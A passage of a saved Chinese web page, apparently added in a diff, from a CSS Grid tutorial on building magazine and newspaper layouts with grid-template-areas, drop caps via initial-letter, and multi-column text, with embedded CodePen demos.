+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">font-variation-settings</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="string"><span class="string">"SSTR"</span></span> <span class="number"><span class="number">183</span></span>, <span class="string"><span class="string">"INLN"</span></span> <span class="number"><span class="number">648</span></span>, <span class="string"><span class="string">"TSHR"</span></span> <span class="number"><span class="number">460</span></span>, <span class="string"><span class="string">"TRSB"</span></span> <span class="number"><span class="number">312</span></span>, <span class="string"><span class="string">"TWRM"</span></span> <span class="number"><span class="number">638</span></span>, <span class="string"><span class="string">"SINL"</span></span> <span class="number"><span class="number">557</span></span>, <span class="string"><span class="string">"TOIL"</span></span> <span class="number"><span class="number">333</span></span>, <span class="string"><span class="string">"TINL"</span></span> <span class="number"><span class="number">526</span></span>, <span class="string"><span class="string">"WORM"</span></span> <span class="number"><span class="number">523</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p><img src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/magazine-layouts-12.jpg" alt=""></p>
+
+<p>最终效果如下：</p>
+
+<div style="margin-bottom: 20px">
+<iframe height="640" style="width: 100%;" scrolling="no" title="Untitled" src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/NWvgEGW(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/NWvgEGW">
+  Untitled</a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<h3 class="content-title" data-index="3">目标二</h3>
+
+<p>目标二和目标一相比，多了两个特性，即 <strong>首字下沉</strong> 和 <strong>多列布局</strong>。其他的和目标一用到的 CSS 特性是相同的。先上 HTML 结构吧：</p>
+
+<pre class="xml"><code class="xml"><span class="comment"><span class="comment">&lt;!-- HTML --&gt;</span></span>
+<span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"grid__container"</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">h1</span></span>&gt;</span></span>Powers&amp;nbsp;of <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">span</span></span>&gt;</span></span>Attraction<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">span</span></span>&gt;</span></span><span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">h1</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">figure</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">img</span></span> <span class="attribute"><span class="attribute">src</span></span>=<span class="value"><span class="value">""</span></span> <span class="attribute"><span class="attribute">alt</span></span>=<span class="value"><span class="value">""</span></span> &gt;</span></span>
+    <span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">figure</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"des"</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">p</span></span>&gt;</span></span>In the modern world...<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">p</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">p</span></span>&gt;</span></span>By Amanda McCrae<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">p</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">div</span></span> <span class="attribute"><span class="attribute">class</span></span>=<span class="value"><span class="value">"content"</span></span>&gt;</span></span>
+        <span class="tag"><span class="tag">&lt;<span class="title"><span class="title">p</span></span>&gt;</span></span>Lorem ipsum ...<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">p</span></span>&gt;</span></span>
+    <span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+<span class="tag"><span class="tag">&lt;/<span class="title"><span class="title">div</span></span>&gt;</span></span>
+</code></pre>
+
+<p>从示例效果上来看，该示例只需要构建一个 <code>3 x 2</code> （两行三列）的网格。和前面示例一样，使用 <code>grid-template-*</code> 和 <code>grid-area</code> 明确放置网格项目，即可达到布局所需的效果：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.grid__container</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">display</span></span></span><span class="rule">:<span class="value"><span class="value"> grid;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-columns</span></span></span><span class="rule">:<span class="value"><span class="value"> auto <span class="number"><span class="number">1</span></span>fr <span class="function"><span class="function">minmax(auto, <span class="number"><span class="number">200</span></span>px)</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-rows</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">minmax(<span class="number"><span class="number">400</span></span>px, max-content)</span></span> auto;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-template-areas</span></span></span><span class="rule">:<span class="value"><span class="value">
+        <span class="string"><span class="string">"figure  des     title"</span></span>
+        <span class="string"><span class="string">"content content content"</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">gap</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">1</span></span>rem;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">width</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">100</span></span>vw;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">min-height</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">100</span></span>%;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="tag"><span class="tag">figure</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> figure;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="tag"><span class="tag">h1</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> title;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.des</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> des;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="class"><span class="class">.content</span></span> <span class="rules"><span class="rules">{
+    <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">grid-area</span></span></span><span class="rule">:<span class="value"><span class="value"> content;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+</code></pre>
+
+<p><img src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/magazine-layouts-13.jpg" alt=""></p>
+
+<p>和上一个示例有所差异是，显式在网格容器中使用了<code>grid-template-areas</code> 定义网格区域名称，接着使用 <code>grid-area</code> 指定网格区域名称来放置网格项目。</p>
+
+<p>另外，该示例和目标一不同之处，使用了 <code>initial-letter</code> 做首字下沉的效果，另外使用 <code>column-count</code> 做多列布局：</p>
+
+<pre class="css"><code class="css"><span class="class"><span class="class">.content</span></span> <span class="rules"><span class="rules">{
+<span class="rule"><span class="attribute"><span class="rule"><span class="attribute">column-count</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">3</span></span>;</span></span></span><span class="value"></span></span>
+<span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+
+<span class="at_rule"><span class="at_rule">@supports (not (initial-letter: <span class="number"><span class="number">5</span></span>)) and (not (-webkit-initial-letter: <span class="number"><span class="number">5</span></span>)) </span></span>{
+    <span class="class"><span class="class">.content</span></span> <span class="tag"><span class="tag">p</span></span><span class="pseudo"><span class="pseudo">:nth-of-type(1)</span></span><span class="pseudo"><span class="pseudo">::first-letter</span></span> <span class="rules"><span class="rules">{
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">float</span></span></span><span class="rule">:<span class="value"><span class="value"> left;</span></span></span><span class="value"></span></span>
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">font-size</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="function"><span class="function">calc(<span class="number"><span class="number">1.15</span></span>rem * <span class="number"><span class="number">6.25</span></span>)</span></span>;</span></span></span><span class="value"></span></span>
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">line-height</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">0.7</span></span>;</span></span></span><span class="value"></span></span>
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">margin</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">17</span></span>px <span class="number"><span class="number">12</span></span>px <span class="number"><span class="number">0</span></span> <span class="number"><span class="number">0</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+}
+
+<span class="at_rule"><span class="at_rule">@supports (initial-letter: <span class="number"><span class="number">5</span></span>) or (-webkit-initial-letter: <span class="number"><span class="number">5</span></span>) </span></span>{
+    <span class="class"><span class="class">.content</span></span> <span class="tag"><span class="tag">p</span></span><span class="pseudo"><span class="pseudo">:nth-of-type(1)</span></span><span class="pseudo"><span class="pseudo">::first-letter</span></span> <span class="rules"><span class="rules">{
+        <span class="rule"><span class="attribute"><span class="rule"><span class="attribute">initial-letter</span></span></span><span class="rule">:<span class="value"><span class="value"> <span class="number"><span class="number">3</span></span>;</span></span></span><span class="value"></span></span>
+    <span class="rule"><span class="rule">}</span></span></span><span class="rule"></span></span>
+}
+</code></pre>
+
+<p>最终效果如下：</p>
+
+<div style="margin-bottom: 20px">
+<iframe height="640" style="width: 100%;" scrolling="no" title="Untitled" src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/RwZZgbJ(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/airen/pen/RwZZgbJ">
+  Untitled</a> by Airen (<a rel="nofollow" href="https://codepen.io/airen">@airen</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p>把上面两个示例使用到的相关特性结合在一起，就可以很容易构建出下面这个报纸布局的效果：</p>
+
+<div style="margin-bottom: 20px">
+<iframe height="800" style="width: 100%;" scrolling="no" title="CSS Grid: Newspaper Layout" src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/BaoXOOP(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/oliviale/pen/BaoXOOP">
+  CSS Grid: Newspaper Layout</a> by Olivia Ng (<a rel="nofollow" href="https://codepen.io/oliviale">@oliviale</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<blockquote>
+  <p>注意，该示例来自于 <a rel="nofollow" href="https://codepen.io/oliviale/full/BaoXOOP" target="_blank">Codenpen 上的 @Olivia Ng </a>。</p>
+</blockquote>
+
+<p>通过上面示例给我们带来的思路，可以借助这些 CSS 特性，比如，<strong>CSS Grid 和 Flexbox</strong> 来完在布局， <strong>CSS 书写模式</strong> 来改变文本的排列方向，特别是让文本竖排 和 <strong>CSS 可变字体</strong> 让文本有个性化的渲染 等可以构建出其他的一些 UI效果，比如音乐门标，电商中的优惠卷等：</p>
+
+<p><img src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/magazine-layouts-14.jpg" alt=""></p>
+
+<p><a rel="nofollow" href="https://codepen.io/cobra_winfrey/full/BaRbKjQ" target="_blank">@Adam Kuhn 在 Codepen 上就用这些特性写了一个这方面的案例</a>：</p>
+
+<div style="margin-bottom: 20px">
+<iframe height="640" style="width: 100%;" scrolling="no" title="Generative Concert Tix" src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/BaRbKjQ(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/cobra_winfrey/pen/BaRbKjQ">
+  Generative Concert Tix</a> by Adam Kuhn (<a rel="nofollow" href="https://codepen.io/cobra_winfrey">@cobra_winfrey</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+
+<p><a rel="nofollow" href="https://codepen.io/Jakeyikapp/full/KKmLLRW" target="_blank">@Jakob Lewis 也用这些技术写了一个饭票的效果</a>：</p>
+
+<div style="margin-bottom: 20px">
+<iframe height="640" style="width: 100%;" scrolling="no" title="Food truck menu CPC using CSS grid" src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/KKmLLRW(1).html" frameborder="no" loading="lazy" allowtransparency="true" allowfullscreen="true">
+  See the Pen <a rel="nofollow" href="https://codepen.io/Jakeyikapp/pen/KKmLLRW">
+  Food truck menu CPC using CSS grid</a> by Jakob Lewis (<a rel="nofollow" href="https://codepen.io/Jakeyikapp">@Jakeyikapp</a>)
+  on <a rel="nofollow" href="https://codepen.io">CodePen</a>.
+</iframe>
+</div>
+</div></div></div>  </div>
+
+  
+   
+    <div id="node_footer" class="clearfix">
+              <div class="previous-next"><span class="prev">上一篇: </span><a href="https://www.w3cplus.com/css/cross-or-superhero-or-comics-layout.html" target="_blank">图解CSS：Grid布局案例之构建交叉布局</a> | <span class="next">下一篇: </span><a href="https://www.w3cplus.com/css/new-reset-css.html" target="_blank">聊聊重置 CSS 那些事儿</a></div>            
+    </div>
+
+        
+
+</div>  </div>
+</div>
+  </div>
+
+        </div>
+
+      </div>
+    </div>
+
+    
+          <div id="sidebar-second" class="col-extra" style="position: sticky; top: 80px;">
+        <!-- <script type="text/javascript">document.write(unescape('%3Cdiv id="bdcs"%3E%3C/div%3E%3Cscript charset="utf-8" src="//rp.baidu.com/rp3w/3w.js?sid=10994702955876242907') + '&t=' + (Math.ceil(new Date()/3600000)) + unescape('"%3E%3C/script%3E'));</script> -->
+          <div class="region region-sidebar-second">
+    <div id="block-custom-search-blocks-1" class="block block-custom-search-blocks">
+
+    
+  <div class="content">
+    <form class="search-form" role="search" action="https://www.w3cplus.com/css/magazine-layouts.html?expire=1699869244&amp;code=OUVtpBZoHPs&amp;sign=f7315a93ce9231b8bf8c1a0b4ba574d5" method="post" id="custom-search-blocks-form-1" accept-charset="UTF-8" target="_self"><div><div class="form-item form-type-textfield form-item-custom-search-blocks-form-1">
+  <label class="element-invisible" for="edit-custom-search-blocks-form-1--2">Search this site </label>
+ <input title="请输入您想搜索的关键词。" class="custom-search-box form-text" placeholder="" type="text" id="edit-custom-search-blocks-form-1--2" name="custom_search_blocks_form_1" value="" size="15" maxlength="128">
+</div>
+<input type="hidden" name="delta" value="1">
+<input type="hidden" name="form_build_id" value="form-hXShGAMnzemEjXSUgNYoWsYH72fkRO4mrmJ594wZ1fE">
+<input type="hidden" name="form_id" value="custom_search_blocks_form_1">
+<div class="form-actions form-wrapper" id="edit-actions"><input type="submit" id="edit-submit" name="op" value="搜索" class="form-submit"></div></div></form>  </div>
+</div>
+<div id="block-block-53" class="block block-block">
+
+    <h2>直达目的地(^_^)</h2>
+  
+  <div class="content">
+    <div class="node-blog-title"><div class="atalog"><ul class="mb-2"> <li> <ul class="mb-2"> <li><a data-index="0" href="javascript:;">杂志报刊类布局可能会用到的布局特性</a></li><li><a data-index="1" href="javascript:;" class="">今天的目标</a></li><li><a data-index="2" href="javascript:;" class="">目标一</a></li><li><a data-index="3" href="javascript:;" class="active">目标二</a></li></ul></li></ul></div></div>
+
+<script>
+$('.node-blog h2').addClass('content-title');
+$('.node-blog h3').addClass('content-title');
+$('.node-blog h4').addClass('content-title');
+$('.node-blog h5').addClass('content-title');
+//  给 h2 到 h5 增加一个 data-index 的自定义属性
+$('.node-blog h2').attr('data-index', 2);
+$('.node-blog h3').attr('data-index', 3);
+$('.node-blog h4').attr('data-index', 4);
+$('.node-blog h5').attr('data-index', 5);
+
+//  函数的一个参数是标题级别，第二个参数是第一个标题的索引值
+function atalog(titleIndex, start) {
+    //  存储 HTML 和当前的索引值
+    var el = {
+        el: '',
+        index: start
+    };
+    var current = 0;  //  已遍历的数量
+
+    for (var i = start;i < $('.content-title').length;i ++) {
+        if (i < current) {
+            //  如果当前 i 的值小于已遍历的数量就跳过
+            continue;
+        }
+
+        if ($('.content-title').eq(i).attr('data-index') > titleIndex) {
+            //  如果是更小一级的标题就调用自身继续查找
+            var result = atalog($('.content-title').eq(i).attr('data-index'), i);
+            //  把返回的 HTML 添加到当前函数的 el 中
+            el.el += '<li> ' + result.el + '</li>';
+            current = result.index + 1;  //  设置已遍历的数量
+            el.index = result.index;  //  设置索引
+            continue;  //  跳过本次循环
+        }
+
+        if ($('.content-title').eq(i).attr('data-index') < titleIndex) {
+            //  如果是更大一级的标题就返回已生成的 HTML 目录
+            el.el = '<ul class="mb-2">' + el.el + '</ul>';
+            return el;
+        }
+        //  生成 HTML 目录
+        el.el += '<li><a data-index="' + i + '" href="javascript:;">' + $('.content-title').eq(i).text() + '</a></li>';
+        el.index = i;  //  设置当前的索引值为 i
+    }
+    //  添加列表的外层 ul
+    el.el = '<ul class="mb-2"> ' + el.el + '</ul>';
+    return el;  //  返回生成的 HTML 目录
+}
+
+//  调用生成目录的函数，从第 0 个 h2 开始
+var el = atalog(2, 0);
+//  把生成的目录插入到文章的开头
+$('.node-blog-title').prepend('<div class="atalog">' + el.el + '</div>');
+$(".node-blog-title .atalog > ul > li >a ").eq(0).addClass('active');
+//  给生成的目录添加点击事件
+$('.node-blog-title .atalog a').on('click', function () {
+    //  设置滚动条的高度为标题的 offsetTop
+     var topPos = $('.content-title').eq($(this).attr('data-index')).offset().top;
+var position = topPos - 80;
+    $(document).scrollTop(position);
+$('.node-blog-title .atalog a').removeClass('active')
+    $(this).toggleClass('active')
+});
+
+
+</script>
+
+  </div>
+</div>
+<div id="block-block-49" class="block block-block">
+
+    
+  <div class="content">
+    <div style="margin-bottom: 5px;"><a rel="nofollow" href="https://s.juejin.cn/ds/iJrTure4/" target="_blank" title="现代 CSS"><img src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/css-1.jpg" border="0" alt="" width="300"></a></div>
+
+<div style="margin-bottom: 5px;"><a rel="nofollow" href="https://s.juejin.cn/ds/DEHQUMj/" target="_blank" title="防御式 CSS 精讲"><img src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/css-3.jpg" border="0" alt="" width="300"></a></div>
+
+<div style="margin-bottom: 5px;"><a rel="nofollow" href="https://s.juejin.cn/ds/iJrwMDDU/" target="_blank" title="现代 Web 布局"><img src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/css-2.jpg" border="0" alt="" width="300"></a></div>
+
+
+  </div>
+</div>
+  </div>
+      </div>
+    
+
+  </div>
+</div>
+
+  <div id="footer-col" class="footer-col">
+    <div class="container">
+        <div class="region region-footer-col">
+    <div id="block-block-39" class="block block-block">
+
+    <h2>关于我们</h2>
+  
+  <div class="content">
+    <a class="media-object" href="http://www.w3cplus.com/">W3cplus</a>
+<div class="media-body">
+	<p>W3cplus是一个致力于推广国内前端行业的技术博客。它以探索为己任，不断活跃在行业技术最前沿，努力提供高质量前端技术博文；其文章范围广泛，主要以CSS、HTML、JavaScript、A11Y、动画等教程为主。</p>
+</div>
+  </div>
+</div>
+<div id="block-block-40" class="block block-block">
+
+    <h2>关于站长</h2>
+  
+  <div class="content">
+    <p><a class="media-object" href="https://www.w3cplus.com/" target="_blank">大漠</a></p>
+<div class="media-body">
+	<p>常用昵称“大漠”，<a href="https://www.w3cplus.com/" target="_blank">W3CPlus</a>创始人，曾就职于淘宝。对HTML、CSS和A11Y等领域有一定的认识和丰富的实践经验。现在主要从事智能UI领域的探讨和学习！。CSS和Drupal中国布道者。2014年出版《<a href="https://www.w3cplus.com/book-comment.html">图解CSS3：核心技术与案例实战</a>》。</p>
+	<div class="social">
+		<a rel="nofollow" class="github" href="https://github.com/airen" target="_blank" title="github">github</a> <a rel="nofollow" class="twitter" href="https://twitter.com/w3cplus" target="_blank" title="twitter">twitter</a></div>
+</div>
+<p>&nbsp;</p>
+  </div>
+</div>
+<div id="block-block-41" class="block block-block">
+
+    <h2>我的作品</h2>
+  
+  <div class="content">
+    <a class="media-object" href="https://www.w3cplus.com/book-comment.html" target="_blank">图解CSS3</a>
+<div class="media-body">
+	<p>本书是历时2载的心血之作，根据最新的CSS撰写，融入了作者在CSS领域多年的使用经验，旨在将本书打造成为CSS领域最权威和实用的专业著作，供没有经验的读者系统学习，供有经验的读者参考备查。新版在《<a href="https://www.w3cplus.com/blog/tags/674.html">图解SS</a>》中持续更新！</p></div>
+  </div>
+</div>
+  </div>
+    </div>
+  </div> 
+
+  <div id="footer" class="footer">
+    <div class="container">
+        <div class="region region-footer">
+    <div id="block-block-54" class="block block-block">
+
+    
+  <div class="content">
+        <p><a rel="nofollow" href="http://www.beian.miit.gov.cn/" target="_blank">湘B2-20110104-7</a>，衡阳市雅米信息技术有限公司 © 2011-2022 <a href="https://www.w3cplus.com/page/26.html" target="_blank">W3CPLUS</a>，感谢<a rel="nofollow" href="https://www.drupal.org/" target="_blank">Drupal</a>开源技术。感谢<a rel="nofollow" href="https://www.qiniu.com/" target="_blank">七牛云存储</a>提供静态资源空间。</p>
+  </div>
+</div>
+  </div>
+    </div>
+  </div> 
+
+<div id="totop" style="position: fixed; bottom: 50px; right: 15px; cursor: pointer; z-index: 999999; display: block; opacity: 1;">
+  <!-- <div id="zhi12-shang-exp-2" class="shang-wrap" style="text-align: center;position:absolute;right: 0;bottom: 130%;z-index: 9999;">
+    <div><a class="zhi12-popup zhi12-widget" rel="nofollow" href="//www.zhi12.com/paycenter/reward?entity=user&id=5491" target="_blank"><img src="/sites/default/files/blogs/2019/1905/w3cplus-shang-2.png" alt="打赏" class="share-img" /></a></div>
+</div> -->
+    <a id="topLink" title="返回顶部">返回顶部</a>
+</div>  <script type="text/javascript" src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/js_VU7P4CTgUZdF2SyFko5LLAg9ZK0OSVjXVaAFnTLgVt0.js.下载"></script>
+  
+  <script type="text/javascript" src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/respond.min.js.下载"></script>
+<script type="text/javascript" src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/js_ypadrG4kz9-JBpNOXmgjyVozLCJG_1RP3Ig-iqWR8n0.js.下载"></script>
+<script type="text/javascript" src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/js_YFY-zVcRx2bEEpwBdCXta7mOli3xeW_KMe7Y6Mv8zGk.js.下载"></script>
+<script type="text/javascript" src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/js_xP4aMPEI1iZ1ZrZMlSgsTllQqvH8oWbOQ7JVFWyrFCo.js.下载"></script>
+<script type="text/javascript">
+<!--//--><![CDATA[//><!--
+jQuery.extend(Drupal.settings, {"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"w3cplusV2","theme_token":"KXM5fJ_wDTrHHpT9UOwDAOF9_H2x8_eJE6yMJOcbYgM","js":{"modules\/statistics\/statistics.js":1,"sites\/all\/modules\/contrib\/respondjs\/lib\/respond.min.js":1,"sites\/all\/modules\/contrib\/jquery_update\/replace\/jquery\/1.10\/jquery.min.js":1,"misc\/jquery-extend-3.4.0.js":1,"misc\/jquery-html-prefilter-3.5.0-backport.js":1,"misc\/jquery.once.js":1,"misc\/drupal.js":1,"public:\/\/languages\/zh-hans_71GwLEjcRL9b45LGd77xwMMW4YJ5etdnokx7XZMwKAc.js":1,"sites\/all\/modules\/contrib\/custom_search\/js\/custom_search.js":1,"sites\/all\/themes\/w3cplusV2\/js\/highlight.pack.js":1,"sites\/all\/themes\/w3cplusV2\/js\/main.js":1},"css":{"modules\/system\/system.base.css":1,"modules\/system\/system.menus.css":1,"modules\/system\/system.messages.css":1,"modules\/system\/system.theme.css":1,"modules\/field\/theme\/field.css":1,"modules\/node\/node.css":1,"modules\/search\/search.css":1,"modules\/user\/user.css":1,"sites\/all\/modules\/contrib\/views\/css\/views.css":1,"sites\/all\/modules\/contrib\/ckeditor\/ckeditor.css":1,"sites\/all\/modules\/contrib\/ctools\/css\/ctools.css":1,"sites\/all\/modules\/contrib\/paywall\/includes\/paywall_php_sdk\/paywall.css":1,"sites\/all\/modules\/contrib\/custom_search\/custom_search.css":1,"sites\/all\/themes\/w3cplusV2\/css\/style.css":1}},"custom_search":{"form_target":"_self","solr":0},"statistics":{"data":{"nid":"2759"},"url":"\/modules\/statistics\/statistics.php"},"urlIsAjaxTrusted":{"\/css\/magazine-layouts.html?expire=1699869244\u0026code=OUVtpBZoHPs\u0026sign=f7315a93ce9231b8bf8c1a0b4ba574d5":true}});
+//--><!]]>
+</script>
+<script src="./Grid布局：23-Grid布局案例之构建杂志报刊类布局_files/jquery.colorbox-min.js.下载"></script>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?177319b798978621f83845b12c86fa29";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>  
+<span class="b96a1"></span>
+<div id="cboxOverlay" style="display: none;"></div><div id="colorbox" class="" role="dialog" tabindex="-1" style="display: none;"><div id="cboxWrapper"><div><div id="cboxTopLeft" style="float: left;"></div><div id="cboxTopCenter" style="float: left;"></div><div id="cboxTopRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxMiddleLeft" style="float: left;"></div><div id="cboxContent" style="float: left;"><div id="cboxTitle" style="float: left;"></div><div id="cboxCurrent" style="float: left;"></div><button type="button" id="cboxPrevious"></button><button type="button" id="cboxNext"></button><button type="button" id="cboxSlideshow"></button><div id="cboxLoadingOverlay" style="float: left;"></div><div id="cboxLoadingGraphic" style="float: left;"></div></div><div id="cboxMiddleRight" style="float: left;"></div></div><div style="clear: left;"><div id="cboxBottomLeft" style="float: left;"></div><div id="cboxBottomCenter" style="float: left;"></div><div id="cboxBottomRight" style="float: left;"></div></div></div><div style="position: absolute; width: 9999px; visibility: hidden; display: none; max-width: none;"></div></div></body></html>
